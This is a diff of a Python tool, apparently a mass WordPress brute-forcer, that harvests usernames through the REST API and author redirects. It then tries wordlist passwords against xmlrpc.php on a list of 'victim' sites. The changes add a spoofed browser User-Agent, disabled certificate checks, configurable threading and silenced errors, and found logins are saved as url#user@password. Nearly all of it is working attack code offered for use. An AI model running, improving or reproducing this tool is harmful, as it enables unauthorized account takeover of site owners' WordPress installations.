@@ -5,26 +5,43 @@
 # visit : c0delabs.com                 #
 ########################################
 
-import requests,argparse,sys,json,time
+import requests,argparse,sys,json,time,re
 from termcolor import colored
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from concurrent.futures import ThreadPoolExecutor
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
 
 def fetching_user(url):
 	print(colored("[{}][*] Fetching user from {}".format(local_time(),url), "blue"))
 	user_list = []
 	try:
-		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=5).content.decode('utf-8')
+		req = requests.get(url+"/wp-json/wp/v2/users/", headers=headers, timeout=5, verify=False, allow_redirects=False).content.decode('utf-8')
 		try:
 			print(colored("[{}][!] Success Fetching user from {}".format(local_time(),url), "green"))
 			for x in json.loads(req):
 				user_list.append(x['slug'])
 		except ValueError:
 			print(colored("[{}][!] Failed {} to Decoding json !\n".format(local_time(),url), "red"))
+			pass
+
+		req = requests.get(url+"/wp-json/wp/v2/users/", headers=headers, timeout=5, verify=False, allow_redirects=False).content.decode('utf-8')
+		try:
+			print(url)
+			response = requests.get(url+"?author=1", headers=headers, timeout=5, verify=False, allow_redirects=True).text
+			pattern_string = re.escape('author/') + "(.*?)" + re.escape('/')
+			titleRE = re.compile(pattern_string)
+			title = titleRE.search(response).group(1)
+			user_list.append(title)
+		except Exception as e:
+			pass
 		
 	except Exception as e:
-		print(colored("[{}][!] Something Wrong !".format(local_time()), "red"))
+		pass
 
 	return user_list
+
 def check_array(arr): 
     if len(arr) == 0: 
         return 0
@@ -42,20 +59,17 @@ def save(format):
 def exploit(url, user_url, list_password):
 	try:
 		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)
-
 		headers = {'Content-Type':'text/xml'}
-		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=15)
+		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=15,verify=False)
 		if "isAdmin" in str(r.content):
 			print(colored("[{}][+] Found username [{}] and password [{}] website {} ".format(local_time(),user_url,list_password,url), "green"))
-			save("success login with username [{}] and password [{}] sites {}".format(user_url,list_password,url))
+			save("{}#{}@{}".format(url,user_url,list_password))
 		else:
 			print(colored("[{}][-] Failed Login {} With username {} password {}".format(local_time(),url,user_url, list_password), "red"))
-	except requests.exceptions.ConnectionError as e:
-		print(colored("[{}][!] ConnectionError :(".format(local_time()), "red"))
 	except Exception as e:
-			print(colored("[{}][!] Something Wrong :(".format(local_time()), "red"))
+			pass
 
-def brute_url(url):
+def brute_url(url,thread):
 	try:
 		username_url = fetching_user(url)
 		user = []
@@ -68,7 +82,7 @@ def brute_url(url):
 
 		password = "wordlist.txt"
 
-		with ThreadPoolExecutor(max_workers=10) as executor:
+		with ThreadPoolExecutor(max_workers=thread) as executor:
 			for user_url in user:
 				with open(password, "r") as password_list:
 					for list_password in password_list:
@@ -76,22 +90,21 @@ def brute_url(url):
 
 
 			user.clear()
-	except requests.exceptions.ConnectionError as e:
-		print(colored("[{}][!] ConnectionError :(".format(local_time()), "red"))
 	except Exception as e:
-		print(colored("[{}][!] Something Wrong :(".format(local_time()), "red"))
+		pass
 
 def main():
  	try:
  		parser = argparse.ArgumentParser(description='Multiple Brute Force XMLRPC [Wordpress]')
  		parser.add_argument("--list", help="List website victim", required=True)
+ 		parser.add_argument("--thread", help="Add Thread ", required=True)
  		args = parser.parse_args()
  		try:
  			with open(args.list, "r") as victim:
  				print(colored("[+] Start Brute Force on {}".format(local_time()), "yellow"))
  				for sites in victim:
  					url = sites.rstrip()
- 					brute_url(url)
+ 					brute_url(url,int(args.thread))
  				print(colored("[+] End Brute Force on {}".format(local_time()), "yellow"))
  		except IOError as e:
  			print("[{}][!] List website victim not exist !".format(local_time()))
